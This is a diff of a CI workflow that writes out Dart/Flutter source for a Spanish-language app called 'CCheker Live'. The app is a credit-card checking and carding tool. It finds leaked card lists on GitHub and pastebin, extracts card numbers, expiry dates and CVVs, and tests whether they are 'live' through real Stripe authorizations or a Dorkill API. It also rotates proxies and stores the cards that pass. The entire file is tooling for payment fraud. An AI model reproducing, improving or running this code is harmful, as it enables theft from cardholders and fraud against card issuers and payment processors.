+                final rate = f.hitRate;
+                await ref.read(sourcesProvider.notifier).upsert(
+                      ScrapeSource(
+                        id: newId(),
+                        name: f.name,
+                        url: f.url,
+                        note: 'descubierta · ${f.origin} · ${fmtInt(f.cards)} tarjetas en la muestra'
+                            '${rate == null ? '' : ' · ${fmtPct(rate)} vivas'}',
+                      ),
+                    );
+              }
+
+              setState(() {
+                _found = _found.where((f) => !_pickedFound.contains(f.url)).toList();
+                _pickedFound.clear();
+              });
+              _snack('${sel.length} fuentes agregadas');
+            }
+
+            Future<void> _addSource() async {
+              final name = TextEditingController();
+              final url = TextEditingController();
+              var kind = SourceKind.cards;
+
+              await showModalBottomSheet<void>(
+                context: context,
+                isScrollControlled: true,
+                backgroundColor: AppColors.bgElevated,
+                shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
+                builder: (ctx) => StatefulBuilder(
+                  builder: (ctx, setLocal) => Padding(
+                    padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom + 20, left: 20, right: 20, top: 20),
+                    child: SingleChildScrollView(
+                      child: Column(
+                        mainAxisSize: MainAxisSize.min,
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          const Text('Nueva fuente', style: AppTextStyles.h2),
+                          const SizedBox(height: 14),
+                          Row(
+                            children: [
+                              for (final k in SourceKind.values)
+                                Padding(
+                                  padding: const EdgeInsets.only(right: 8),
+                                  child: ChoiceChip(
+                                    label: Text(k == SourceKind.bins ? 'base BIN' : 'tarjetas'),
+                                    selected: kind == k,
+                                    onSelected: (_) => setLocal(() => kind = k),
+                                  ),
+                                ),
+                            ],
+                          ),
+                          const SizedBox(height: 12),
+                          TextField(controller: name, style: AppTextStyles.mono, decoration: const InputDecoration(labelText: 'nombre')),
+                          TextField(controller: url, style: AppTextStyles.mono, decoration: const InputDecoration(labelText: 'url')),
+                          const SizedBox(height: 16),
+                          NeonButton(
+                            label: 'Agregar',
+                            icon: Icons.add,
+                            onPressed: () async {
+                              if (url.text.trim().isEmpty) return;
+                              await ref.read(sourcesProvider.notifier).upsert(
+                                    ScrapeSource(
+                                      id: newId(),
+                                      name: name.text.trim().isEmpty ? 'fuente' : name.text.trim(),
+                                      url: url.text.trim(),
+                                      kind: kind,
+                                    ),
+                                  );
+                              if (ctx.mounted) Navigator.pop(ctx);
+                            },
+                          ),
+                        ],
+                      ),
+                    ),
+                  ),
+                ),
+              );
+
+              _disposeLater([name, url]);
+            }
+
+            Widget _preset((String, String) p) {
+              final on = _query.text.trim() == p.$2;
+              return GestureDetector(
+                onTap: _finding ? null : () => setState(() => _query.text = p.$2),
+                child: Container(
+                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+                  decoration: BoxDecoration(
+                    color: on ? AppColors.lime.withOpacity(0.15) : AppColors.glass,
+                    borderRadius: BorderRadius.circular(20),
+                    border: Border.all(color: on ? AppColors.lime.withOpacity(0.5) : AppColors.glassStroke),
+                  ),
+                  child: Text(p.$1, style: TextStyle(fontSize: 11, color: on ? AppColors.lime : AppColors.textMid)),
+                ),
+              );
+            }
+
+            Widget _foundTile(FoundSource f) {
+              final on = _pickedFound.contains(f.url);
+              final rate = f.hitRate;
+              final rateColor = rate == null
+                  ? AppColors.textLo
+                  : rate >= 0.5
+                      ? AppColors.lime
+                      : rate >= 0.2
+                          ? AppColors.amber
+                          : AppColors.red;
+
+              return Padding(
+                padding: const EdgeInsets.only(bottom: 8),
+                child: GestureDetector(
+                  onTap: () => setState(() {
+                    if (!_pickedFound.remove(f.url)) _pickedFound.add(f.url);
+                  }),
+                  child: Container(
+                    padding: const EdgeInsets.all(10),
+                    decoration: BoxDecoration(
+                      color: on ? AppColors.lime.withOpacity(0.08) : AppColors.glass.withOpacity(0.5),
+                      borderRadius: BorderRadius.circular(12),
+                      border: Border.all(color: on ? AppColors.lime.withOpacity(0.5) : AppColors.glassStroke),
+                    ),
+                    child: Row(
+                      children: [
+                        Icon(
+                          on ? Icons.check_circle : Icons.circle_outlined,
+                          size: 16,
+                          color: on ? AppColors.lime : AppColors.textLo,
+                        ),
+                        const SizedBox(width: 10),
+                        Expanded(
+                          child: Column(
+                            crossAxisAlignment: CrossAxisAlignment.start,
+                            children: [
+                              Row(
+                                children: [
+                                  Flexible(
+                                    child: Text(f.name, style: AppTextStyles.mono, maxLines: 1, overflow: TextOverflow.ellipsis),
+                                  ),
+                                  const SizedBox(width: 8),
+                                  StatusPill(text: '${fmtInt(f.cards)} CC', color: AppColors.cyan),
+                                  if (rate != null) ...[
+                                    const SizedBox(width: 6),
+                                    StatusPill(
+                                      text: '${fmtPct(rate)} viva (${f.live}/${f.checked})',
+                                      color: rateColor,
+                                    ),
+                                  ],
+                                ],
+                              ),
+                              Text(
+                                '${f.origin} · ${(f.bytes / 1024).round()} KB · ${f.ms}ms',
+                                style: AppTextStyles.tiny,
+                                maxLines: 1,
+                                overflow: TextOverflow.ellipsis,
+                              ),
+                            ],
+                          ),
+                        ),
+                      ],
+                    ),
+                  ),
+                ),
+              );
+            }
+
+            Widget _sourceTile(ScrapeSource s) {
+              final on = _picked.contains(s.id);
+
+              return Padding(
+                padding: const EdgeInsets.only(bottom: 8),
+                child: GlassPanel(
+                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
+                  child: Row(
+                    children: [
+                      Checkbox(
+                        value: on,
+                        activeColor: AppColors.lime,
+                        onChanged: (v) => setState(() {
+                          if (v == true) {
+                            _picked.add(s.id);
+                          } else {
+                            _picked.remove(s.id);
+                          }
+                        }),
+                      ),
+                      Expanded(
+                        child: Column(
+                          crossAxisAlignment: CrossAxisAlignment.start,
+                          children: [
+                            Row(
+                              children: [
+                                Flexible(
+                                  child: Text(s.name, style: AppTextStyles.body, maxLines: 1, overflow: TextOverflow.ellipsis),
+                                ),
+                                const SizedBox(width: 8),
+                                StatusPill(
+                                  text: s.kind == SourceKind.bins ? 'BIN' : 'CC',
+                                  color: s.kind == SourceKind.bins ? AppColors.violet : AppColors.cyan,
+                                ),
+                              ],
+                            ),
+                            if (s.note.isNotEmpty)
+                              Text(s.note, style: AppTextStyles.tiny, maxLines: 1, overflow: TextOverflow.ellipsis),
+                            Text(s.url, style: AppTextStyles.tiny, maxLines: 1, overflow: TextOverflow.ellipsis),
+                          ],
+                        ),
+                      ),
+                      IconButton(
+                        icon: const Icon(Icons.close, size: 16, color: AppColors.textLo),
+                        onPressed: () => ref.read(sourcesProvider.notifier).remove(s.id),
+                      ),
+                    ],
+                  ),
+                ),
+              );
+            }
+
+            Widget _reportTile(ScrapeReport r) {
+              final color = r.error != null ? AppColors.red : (r.cards.isEmpty && r.bins == 0 ? AppColors.amber : AppColors.lime);
+
+              final detail = r.error != null
+                  ? r.error!
+                  : r.bins > 0
+                      ? 'base BIN instalada: ${fmtInt(r.bins)} entradas'
+                      : '${fmtInt(r.cards.length)} nuevas · ${fmtInt(r.found)} detectadas · ${fmtInt(r.dup)} repetidas · ${fmtInt(r.junk)} descartadas';
+
+              return Padding(
+                padding: const EdgeInsets.only(bottom: 8),
+                child: GlassPanel(
+                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
+                  child: Row(
+                    children: [
+                      Icon(r.error != null ? Icons.error_outline : Icons.check_circle_outline, size: 16, color: color),
+                      const SizedBox(width: 10),
+                      Expanded(
+                        child: Column(
+                          crossAxisAlignment: CrossAxisAlignment.start,
+                          children: [
+                            Text(r.source, style: AppTextStyles.body, maxLines: 1, overflow: TextOverflow.ellipsis),
+                            Text(detail, style: AppTextStyles.tiny, maxLines: 2),
+                          ],
+                        ),
+                      ),
+                      Text('${r.ms}ms', style: AppTextStyles.tiny),
+                    ],
+                  ),
+                ),
+              );
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              final sources = ref.watch(sourcesProvider);
+              final st = ref.watch(scrapeProvider);
+              final n = ref.read(scrapeProvider.notifier);
+              final picked = sources.where((s) => _picked.contains(s.id)).toList();
+              final busy = _finding || _scoring;
+
+              return ListView(
+                padding: const EdgeInsets.all(16),
+                children: [
+                  GlassPanel(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        const Text(
+                          'Trae listas ya armadas desde la web, o busca en GitHub y prueba los archivos uno por uno '
+                          'para quedarte solo con los que traen tarjetas de verdad.',
+                          style: AppTextStyles.caption,
+                        ),
+                        const SizedBox(height: 10),
+                        Text('Tope por fuente: ${_limit.round()}', style: AppTextStyles.body),
+                        Slider(
+                          value: _limit,
+                          min: 50,
+                          max: 2000,
+                          divisions: 39,
+                          onChanged: st.running ? null : (v) => setState(() => _limit = v),
+                        ),
+                        SwitchListTile(
+                          contentPadding: EdgeInsets.zero,
+                          title: const Text('Completar BIN faltante online', style: AppTextStyles.body),
+                          subtitle: const Text('binlist.net, sin key, ~1 req/s', style: AppTextStyles.caption),
+                          value: st.onlineBin,
+                          activeColor: AppColors.cyan,
+                          onChanged: n.setOnlineBin,
+                        ),
+                      ],
+                    ),
+                  ),
+                  const SectionHeader('Buscador de fuentes'),
+                  GlassPanel(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        TextField(
+                          controller: _query,
+                          onChanged: (_) => setState(() {}),
+                          style: AppTextStyles.mono,
+                          decoration: const InputDecoration(hintText: 'que buscar', hintStyle: AppTextStyles.caption),
+                        ),
+                        const SizedBox(height: 8),
+                        Wrap(spacing: 8, runSpacing: 8, children: finderPresets.map(_preset).toList()),
+                        const SizedBox(height: 10),
+                        Text('Repos a revisar: ${_repos.round()}', style: AppTextStyles.body),
+                        Slider(
+                          value: _repos,
+                          min: 3,
+                          max: 15,
+                          divisions: 12,
+                          onChanged: busy ? null : (v) => setState(() => _repos = v),
+                        ),
+                        TextField(
+                          controller: _token,
+                          obscureText: true,
+                          style: AppTextStyles.mono,
+                          onChanged: (v) {
+                            Vault.i.data['gh_token'] = v.trim();
+                            Vault.i.saveSoon();
+                          },
+                          decoration: const InputDecoration(
+                            labelText: 'token de GitHub (opcional)',
+                            labelStyle: AppTextStyles.caption,
+                          ),
+                        ),
+                        const SizedBox(height: 6),
+                        const Text(
+                          'Sin token: 60 llamadas/hora, alcanza para ~5 busquedas. Con token: 5000/hora.',
+                          style: AppTextStyles.tiny,
+                        ),
+                        const SizedBox(height: 12),
+                        NeonButton(
+                          label: _finding ? 'trabajando' : 'Buscar y probar',
+                          icon: Icons.travel_explore,
+                          expand: true,
+                          onPressed: busy ? null : _runFinder,
+                        ),
+                        const SizedBox(height: 8),
+                        Text('Muestra a chequear por fuente: ${_sample.round()}', style: AppTextStyles.body),
+                        Slider(
+                          value: _sample,
+                          min: 5,
+                          max: 25,
+                          divisions: 20,
+                          onChanged: busy ? null : (v) => setState(() => _sample = v),
+                        ),
+                        Text(
+                          'Puntuar usa Stripe y gasta ${_sample.round()} requests por fuente (maximo 12 fuentes).',
+                          style: AppTextStyles.tiny,
+                        ),
+                        const SizedBox(height: 10),
+                        NeonButton(
+                          label: _scoring ? 'puntuando' : 'Puntuar tasa de vivas',
+                          icon: Icons.speed,
+                          color: AppColors.cyan,
+                          expand: true,
+                          onPressed: busy || _found.isEmpty ? null : _runScore,
+                        ),
+                        if (_step.isNotEmpty) ...[
+                          const SizedBox(height: 8),
+                          Text(_step, style: AppTextStyles.caption, maxLines: 2),
+                        ],
+                      ],
+                    ),
+                  ),
+                  if (_found.isNotEmpty) ...[
+                    const SizedBox(height: 10),
+                    Text(
+                      '${_found.length} fuentes con tarjetas verificadas ahora mismo',
+                      style: const TextStyle(color: AppColors.lime, fontWeight: FontWeight.w700),
+                    ),
+                    const SizedBox(height: 8),
+                    ..._found.map(_foundTile),
+                    const SizedBox(height: 4),
+                    NeonButton(
+                      label: 'Agregar seleccionadas (${_pickedFound.length})',
+                      icon: Icons.playlist_add,
+                      expand: true,
+                      onPressed: _pickedFound.isEmpty ? null : _addFound,
+                    ),
+                  ],
+                  const SectionHeader('Mis fuentes'),
+                  ...sources.map(_sourceTile),
+                  const SizedBox(height: 6),
+                  Wrap(
+                    spacing: 10,
+                    runSpacing: 10,
+                    children: [
+                      NeonButton(
+                        label: st.running ? 'trabajando' : 'Traer seleccionadas (${picked.length})',
+                        icon: Icons.cloud_download_outlined,
+                        onPressed: st.running || picked.isEmpty ? null : () => n.pull(picked, limit: _limit.round()),
+                      ),
+                      NeonButton(
+                        label: 'Traer todas',
+                        icon: Icons.download_for_offline_outlined,
+                        color: AppColors.cyan,
+                        onPressed: st.running ? null : () => n.pull(sources, limit: _limit.round()),
+                      ),
+                      NeonButton(label: 'Agregar fuente', icon: Icons.add, color: AppColors.violet, onPressed: st.running ? null : _addSource),
+                      NeonButton(
+                        label: 'Restaurar',
+                        icon: Icons.restore,
+                        color: AppColors.textMid,
+                        onPressed: st.running ? null : () => ref.read(sourcesProvider.notifier).reset(),
+                      ),
+                    ],
+                  ),
+                  const SectionHeader('Extraer de una URL'),
+                  GlassPanel(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        const Text(
+                          'Acepta raw txt, pastebin, gist, tablas HTML o JSON. Ej: https://pastebin.com/raw/XXXX',
+                          style: AppTextStyles.caption,
+                        ),
+                        const SizedBox(height: 10),
+                        TextField(
+                          controller: _url,
+                          onChanged: (_) => setState(() {}),
+                          style: AppTextStyles.mono,
+                          decoration: const InputDecoration(hintText: 'https://...', hintStyle: AppTextStyles.caption),
+                        ),
+                        const SizedBox(height: 10),
+                        NeonButton(
+                          label: 'Extraer',
+                          icon: Icons.travel_explore,
+                          expand: true,
+                          onPressed: st.running
+                              ? null
+                              : () async {
+                                  final u = _url.text.trim();
+                                  if (u.isEmpty) {
+                                    _snack('Pega una URL primero');
+                                    return;
+                                  }
+                                  await n.pullUrl(u, limit: _limit.round());
+                                  _snack('Extraccion terminada');
+                                },
+                        ),
+                      ],
+                    ),
+                  ),
+                  if (st.running) ...[
+                    const SectionHeader('Progreso'),
+                    GlassPanel(
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Text('fuente: ${st.current}', style: AppTextStyles.body, maxLines: 1, overflow: TextOverflow.ellipsis),
+                          const SizedBox(height: 8),
+                          SegmentedProgress(value: st.pct),
+                          const SizedBox(height: 8),
+                          Row(
+                            children: [
+                              Text('${st.done}/${st.total}', style: AppTextStyles.caption),
+                              const Spacer(),
+                              NeonButton(label: 'Cancelar', color: AppColors.red, onPressed: n.cancel),
+                            ],
+                          ),
+                        ],
+                      ),
+                    ),
+                  ],
+                  if (st.reports.isNotEmpty) ...[
+                    const SectionHeader('Resultados'),
+                    ...st.reports.map(_reportTile),
+                  ],
+                  if (st.staged.isNotEmpty) ...[
+                    const SectionHeader('Encontradas'),
+                    GlassPanel(
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Text(
+                            '${fmtInt(st.staged.length)} tarjetas nuevas listas para guardar',
+                            style: const TextStyle(color: AppColors.lime, fontWeight: FontWeight.w700),
+                          ),
+                          const SizedBox(height: 8),
+                          ...st.staged.take(15).map(
+                                (c) => Padding(
+                                  padding: const EdgeInsets.symmetric(vertical: 2),
+                                  child: Text('${maskPan(c.pan)}  ${c.expLabel}  ${c.cvv}', style: AppTextStyles.mono),
+                                ),
+                              ),
+                          if (st.staged.length > 15) Text('y ${st.staged.length - 15} mas', style: AppTextStyles.caption),
+                        ],
+                      ),
+                    ),
+                    const SizedBox(height: 12),
+                    NeonButton(
+                      label: 'Guardar ${fmtInt(st.staged.length)}',
+                      icon: Icons.save_alt,
+                      expand: true,
+                      onPressed: () async {
+                        await n.commit();
+                        _snack('Guardadas');
+                      },
+                    ),
+                    const SizedBox(height: 10),
+                    NeonButton(
+                      label: 'Guardar y chequear',
+                      icon: Icons.bolt,
+                      color: AppColors.cyan,
+                      expand: true,
+                      onPressed: () => n.commit(andRun: true),
+                    ),
+                    const SizedBox(height: 10),
+                    NeonButton(
+                      label: 'Descartar',
+                      icon: Icons.delete_outline,
+                      color: AppColors.red,
+                      expand: true,
+                      onPressed: () => n.clear(),
+                    ),
+                  ],
+                  const SizedBox(height: 40),
+                ],
+              );
+            }
+          }
+          DART
+
           cat > lib/screens/analysis.dart <<'DART'
           import 'dart:convert';
           import 'dart:io';
 
+          import 'package:cross_file/cross_file.dart' show XFile;
           import 'package:flutter/material.dart';
           import 'package:flutter/services.dart';
           import 'package:flutter_riverpod/flutter_riverpod.dart';
@@ -3417,7 +5749,7 @@ jobs:
               final byBrand = <String, List<int>>{};
               for (final c in all) {
                 final b = c.brand.isEmpty ? 'sin marca' : c.brand;
-                final e = byBrand.putIfAbsent(b, () => [0, 0]);
+                final e = byBrand.putIfAbsent(b, () => <int>[0, 0]);
                 e[0]++;
                 if (c.status == CheckStatus.live) e[1]++;
               }
@@ -3517,10 +5849,8 @@ jobs:
                               icon: Icons.event_busy,
                               color: AppColors.violet,
                               onPressed: () async {
-                                final out = ref
-                                    .read(cardsProvider)
-                                    .map((c) => c.expired ? c.copyWith(status: CheckStatus.dead) : c)
-                                    .toList();
+                                final out =
+                                    ref.read(cardsProvider).map((c) => c.expired ? c.copyWith(status: CheckStatus.dead) : c).toList();
                                 await ref.read(cardsProvider.notifier).replaceAll(out);
                                 _snack('$expired marcadas');
                               },
@@ -3543,10 +5873,7 @@ jobs:
                     ),
                   ),
                   if (_note.isNotEmpty)
-                    Padding(
-                      padding: const EdgeInsets.only(top: 14),
-                      child: Text(_note, style: AppTextStyles.caption),
-                    ),
+                    Padding(padding: const EdgeInsets.only(top: 14), child: Text(_note, style: AppTextStyles.caption)),
                 ],
               );
             }
@@ -3573,6 +5900,14 @@ jobs:
           class _ProxiesScreenState extends ConsumerState<ProxiesScreen> {
             bool _testing = false;
             final _exit = <String, String>{};
+
+            void _disposeLater(List<TextEditingController> cs) {
+              Future<void>.delayed(const Duration(milliseconds: 350), () {
+                for (final c in cs) {
+                  c.dispose();
+                }
+              });
+            }
 
             void _snack(String m) {
               if (!mounted) return;
@@ -3650,6 +5985,8 @@ jobs:
                   ),
                 ),
               );
+
+              _disposeLater([host, port, user, pass]);
             }
 
             Future<void> _paste() async {
@@ -3668,7 +6005,7 @@ jobs:
                     children: [
                       const Text('Pegar lista', style: AppTextStyles.h2),
                       const SizedBox(height: 4),
-                      const Text('host:puerto:usuario:clave por linea', style: AppTextStyles.caption),
+                      const Text('host:puerto:usuario:clave  ·  o  usuario:clave@host:puerto', style: AppTextStyles.caption),
                       const SizedBox(height: 12),
                       TextField(controller: ctrl, maxLines: 6, style: AppTextStyles.mono),
                       const SizedBox(height: 14),
@@ -3676,33 +6013,55 @@ jobs:
                         label: 'Importar',
                         icon: Icons.download_rounded,
                         onPressed: () async {
-                          var n = 0;
+                          final batch = <ProxyNode>[];
                           for (final line in ctrl.text.split(RegExp(r'[\r\n]+'))) {
-                            final t = line.trim();
-                            if (t.isEmpty) continue;
-                            final p = t.split(RegExp(r'[:\s@]+')).where((s) => s.isNotEmpty).toList();
-                            if (p.length < 2) continue;
-                            final port = int.tryParse(p[1]) ?? 0;
-                            if (port == 0) continue;
-                            await ref.read(proxiesProvider.notifier).upsert(
-                                  ProxyNode(
-                                    id: newId(),
-                                    host: p[0],
-                                    port: port,
-                                    user: p.length > 2 ? p[2] : '',
-                                    pass: p.length > 3 ? p[3] : '',
-                                  ),
-                                );
-                            n++;
+                            final node = _parseProxyLine(line);
+                            if (node != null) batch.add(node);
                           }
+                          await ref.read(proxiesProvider.notifier).addAll(batch);
                           if (ctx.mounted) Navigator.pop(ctx);
-                          _snack('$n proxies importados');
+                          _snack('${batch.length} proxies importados');
                         },
                       ),
                     ],
                   ),
                 ),
               );
+
+              _disposeLater([ctrl]);
+            }
+
+            ProxyNode? _parseProxyLine(String line) {
+              var rest = line.trim();
+              if (rest.isEmpty) return null;
+
+              var user = '';
+              var pass = '';
+
+              if (rest.contains('@')) {
+                final parts = rest.split('@');
+                if (parts.length == 2) {
+                  final cred = parts[0].split(':');
+                  if (cred.length == 2) {
+                    user = cred[0];
+                    pass = cred[1];
+                  }
+                  rest = parts[1];
+                }
+              }
+
+              final hp = rest.split(RegExp(r'[:\s]+')).where((s) => s.isNotEmpty).toList();
+              if (hp.length < 2) return null;
+
+              final port = int.tryParse(hp[1]) ?? 0;
+              if (port == 0 || port > 65535) return null;
+
+              if (user.isEmpty && hp.length >= 3) {
+                user = hp[2];
+                if (hp.length >= 4) pass = hp[3];
+              }
+
+              return ProxyNode(id: newId(), host: hp[0], port: port, user: user, pass: pass);
             }
 
             Future<void> _checkExits() async {
@@ -3734,6 +6093,7 @@ jobs:
               setState(() => _testing = true);
 
               final engine = CheckEngine(ref.read(settingsProvider));
+              final results = <String, (ProxyHealth, int)>{};
               var cursor = 0;
 
               Future<void> worker() async {
@@ -3742,16 +6102,14 @@ jobs:
                   if (i >= list.length) return;
                   cursor++;
                   final out = await engine.probe(list[i]);
-                  await ref.read(proxiesProvider.notifier).setHealth(
-                        list[i].id,
-                        out.ok ? ProxyHealth.up : ProxyHealth.down,
-                        out.ms,
-                      );
+                  results[list[i].id] = (out.ok ? ProxyHealth.up : ProxyHealth.down, out.ms);
                 }
               }
 
               await Future.wait(List.generate(6, (_) => worker()));
               engine.dispose();
+
+              await ref.read(proxiesProvider.notifier).setHealthMany(results);
 
               if (!mounted) return;
               setState(() => _testing = false);
@@ -3793,13 +6151,8 @@ jobs:
                               icon: Icons.delete_sweep,
                               color: AppColors.red,
                               onPressed: () async {
-                                final ids = list
-                                    .where((p) => p.health == ProxyHealth.down)
-                                    .map((p) => p.id)
-                                    .toList();
-                                for (final id in ids) {
-                                  await ref.read(proxiesProvider.notifier).remove(id);
-                                }
+                                final ids = list.where((p) => p.health == ProxyHealth.down).map((p) => p.id).toSet();
+                                await ref.read(proxiesProvider.notifier).removeMany(ids);
                               },
                             ),
                           ],
@@ -3872,6 +6225,7 @@ jobs:
           import '../net.dart';
           import '../providers.dart';
           import '../repos.dart';
+          import '../selftest.dart';
           import '../theme.dart';
           import '../widgets.dart';
 
@@ -3885,6 +6239,9 @@ jobs:
             late final TextEditingController _skey;
             late final TextEditingController _dkey;
             late final TextEditingController _pass;
+
+            List<CheckOutcome> _results = [];
+            bool _running = false;
 
             @override
             void initState() {
@@ -3917,18 +6274,36 @@ jobs:
               ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(m)));
             }
 
+            Future<void> _runDiagnostic() async {
+              setState(() {
+                _running = true;
+                _results = [];
+              });
+
+              final local = SelfTest.local();
+              final remote = await SelfTest.remote(ref.read(settingsProvider), ref.read(proxiesProvider));
+
+              if (!mounted) return;
+              setState(() {
+                _results = [...local, ...remote];
+                _running = false;
+              });
+            }
+
             Future<void> _download() async {
               final st = ref.read(binStatusProvider.notifier);
               st.state = const BinStatus(busy: true, note: 'descargando');
 
               try {
                 await BinDb.i.download(onProgress: (b, t) {
-                  st.state = st.state.copyWith(
-                    note: 'descargando ${(b / 1048576).toStringAsFixed(1)}/${(t / 1048576).toStringAsFixed(1)} MB',
-                  );
+                  final mb = (b / 1048576).toStringAsFixed(1);
+                  final tot = t == 0 ? '?' : (t / 1048576).toStringAsFixed(1);
+                  st.state = st.state.copyWith(note: 'descargando $mb/$tot MB');
                 });
                 st.state = st.state.copyWith(note: 'indexando');
-                final n = await BinDb.i.buildIndex();
+                final n = await BinDb.i.buildIndex(
+                  onProgress: (lines) => st.state = st.state.copyWith(note: 'indexando $lines lineas'),
+                );
                 await ref.read(settingsProvider.notifier).setOfflineDb(true);
                 st.state = BinStatus(installed: true, count: n, note: 'lista');
                 _snack('Base lista: ${fmtInt(n)} BINs');
@@ -3951,9 +6326,59 @@ jobs:
               final n = ref.read(settingsProvider.notifier);
               final bin = ref.watch(binStatusProvider);
 
+              final failed = _results.where((r) => !r.ok).length;
+
               return ListView(
                 padding: const EdgeInsets.all(16),
                 children: [
+                  const SectionHeader('Diagnostico'),
+                  GlassPanel(
+                    child: Column(
+                      crossAxisAlignment: CrossAxisAlignment.start,
+                      children: [
+                        const Text(
+                          'Verifica Luhn, parser, generador, HTML, red y motor. Si algo falla, sale en rojo.',
+                          style: AppTextStyles.caption,
+                        ),
+                        const SizedBox(height: 12),
+                        NeonButton(
+                          label: _running ? 'corriendo' : 'Correr diagnostico',
+                          icon: Icons.health_and_safety_outlined,
+                          expand: true,
+                          onPressed: _running ? null : _runDiagnostic,
+                        ),
+                        if (_results.isNotEmpty) ...[
+                          const SizedBox(height: 12),
+                          Text(
+                            failed == 0 ? 'todo en verde (${_results.length} pruebas)' : '$failed fallas de ${_results.length}',
+                            style: TextStyle(
+                              fontWeight: FontWeight.w700,
+                              color: failed == 0 ? AppColors.lime : AppColors.red,
+                            ),
+                          ),
+                          const SizedBox(height: 8),
+                          ..._results.map(
+                            (r) => Padding(
+                              padding: const EdgeInsets.symmetric(vertical: 3),
+                              child: Row(
+                                crossAxisAlignment: CrossAxisAlignment.start,
+                                children: [
+                                  Icon(
+                                    r.ok ? Icons.check_circle_outline : Icons.error_outline,
+                                    size: 14,
+                                    color: r.ok ? AppColors.lime : AppColors.red,
+                                  ),
+                                  const SizedBox(width: 8),
+                                  Expanded(child: Text(r.name, style: AppTextStyles.caption)),
+                                  Text(r.detail, style: AppTextStyles.tiny),
+                                ],
+                              ),
+                            ),
+                          ),
+                        ],
+                      ],
+                    ),
+                  ),
                   const SectionHeader('Motor de validacion'),
                   GlassPanel(
                     child: Column(
@@ -3971,9 +6396,9 @@ jobs:
                         const SizedBox(height: 8),
                         Text(
                           s.engine == 'stripe'
-                              ? 'Stripe: valida formato, vencimiento y CVV.'
+                              ? 'Stripe: autorizacion real contra el emisor. Se limita con 429 si abusas de la misma key.'
                               : s.engine == 'dorkill'
-                                  ? 'Dorkill: necesita una API key.'
+                                  ? 'Dorkill: necesita una API key del panel (dorkill.com, seccion Cards, API).'
                                   : 'Cascada: cruza los dos. Viva solo si uno acepta; nunca marca muerta si hubo error de red.',
                           style: AppTextStyles.caption,
                         ),
@@ -3982,7 +6407,7 @@ jobs:
                           TextField(
                             controller: _skey,
                             style: AppTextStyles.mono,
-                            onSubmitted: n.setStripeKey,
+                            onChanged: n.setStripeKey,
                             decoration: const InputDecoration(
                               labelText: 'Stripe publishable key',
                               labelStyle: AppTextStyles.caption,
@@ -3994,7 +6419,7 @@ jobs:
                           TextField(
                             controller: _dkey,
                             style: AppTextStyles.mono,
-                            onSubmitted: n.setDorkillKey,
+                            onChanged: n.setDorkillKey,
                             decoration: const InputDecoration(
                               labelText: 'API key de Dorkill',
                               labelStyle: AppTextStyles.caption,
@@ -4163,11 +6588,7 @@ jobs:
                               return;
                             }
                             n.setBiometrics(v);
-                            if (v) {
-                              await Vault.i.rememberPass();
-                            } else {
-                              await Vault.i.forgetPass();
-                            }
+                            if (v) await Vault.i.rememberPass();
                           },
                         ),
                         Text('Bloqueo automatico: ${s.autoLockMin} min', style: AppTextStyles.body),
@@ -4186,28 +6607,28 @@ jobs:
                     child: Column(
                       crossAxisAlignment: CrossAxisAlignment.start,
                       children: [
-                        Consumer(builder: (_, ref, __) {
-                          final net = ref.watch(netProvider);
-                          return Row(
-                            children: [
-                              Icon(
-                                net.online ? Icons.wifi : Icons.wifi_off,
-                                size: 16,
-                                color: net.online ? AppColors.lime : AppColors.red,
-                              ),
-                              const SizedBox(width: 8),
-                              Expanded(
-                                child: Text(
-                                  net.online
-                                      ? (net.wifi ? 'conectado por wifi' : 'conectado por datos')
-                                      : 'sin conexion',
-                                  style: AppTextStyles.body,
+                        Consumer(
+                          builder: (_, ref, __) {
+                            final net = ref.watch(netProvider);
+                            return Row(
+                              children: [
+                                Icon(
+                                  net.online ? Icons.wifi : Icons.wifi_off,
+                                  size: 16,
+                                  color: net.online ? AppColors.lime : AppColors.red,
                                 ),
-                              ),
-                              Text('${net.latencyMs}ms', style: AppTextStyles.caption),
-                            ],
-                          );
-                        }),
+                                const SizedBox(width: 8),
+                                Expanded(
+                                  child: Text(
+                                    net.online ? (net.wifi ? 'conectado por wifi' : 'conectado por datos') : 'sin conexion',
+                                    style: AppTextStyles.body,
+                                  ),
+                                ),
+                                Text('${net.latencyMs}ms', style: AppTextStyles.caption),
+                              ],
+                            );
+                          },
+                        ),
                         const SizedBox(height: 10),
                         NeonButton(
                           label: 'Probar red',
@@ -4251,9 +6672,9 @@ jobs:
                           icon: Icons.lan_outlined,
                           color: AppColors.amber,
                           onPressed: () async {
-                            for (final p in ref.read(proxiesProvider).toList()) {
-                              await ref.read(proxiesProvider.notifier).remove(p.id);
-                            }
+                            await ref
+                                .read(proxiesProvider.notifier)
+                                .removeMany(ref.read(proxiesProvider).map((p) => p.id).toSet());
                             _snack('Proxies borrados');
                           },
                         ),
@@ -4295,35 +6716,16 @@ jobs:
           }
           DART
 
-          cat > /tmp/android_patch.sh <<'SH'
-          set -e
-          MAN=android/app/src/main/AndroidManifest.xml
-          sed -i 's/android:label="ccheker_live"/android:label="CCheker Live"/' "$MAN"
-          sed -i 's|<application|<uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.USE_BIOMETRIC"/>\n    <uses-permission android:name="android.permission.USE_FINGERPRINT"/>\n    <application|' "$MAN"
-
-          MA=$(find android/app/src/main/kotlin -name "MainActivity.kt" | head -n1)
-          PKG=$(echo "$MA" | sed 's|android/app/src/main/kotlin/||; s|/MainActivity.kt||; s|/|.|g')
-          cat > "$MA" <<KT
-          package $PKG
-
-          import io.flutter.embedding.android.FlutterFragmentActivity
-
-          class MainActivity : FlutterFragmentActivity()
-          KT
-
-          GR=android/app/build.gradle
